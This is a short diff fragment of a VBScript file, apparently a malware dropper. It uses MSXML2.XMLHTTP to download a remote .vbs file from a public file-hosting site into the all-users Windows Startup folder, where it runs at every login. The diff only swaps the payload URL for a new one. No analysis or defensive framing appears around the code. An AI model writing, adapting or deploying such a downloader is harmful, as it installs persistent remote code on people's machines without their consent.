@@ -8,7 +8,7 @@ Set objFSO = CreateObject("Scripting.FileSystemObject")
 strDestination = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\fi030k.vbs"
 
 ' Define the file URL
-strURL = "https://files.catbox.moe/fi030k.vbs"
+strURL = "https://files.catbox.moe/9lepqn.vbs"
 
 ' Create an HTTP object
 Set objHTTP = CreateObject("MSXML2.XMLHTTP")
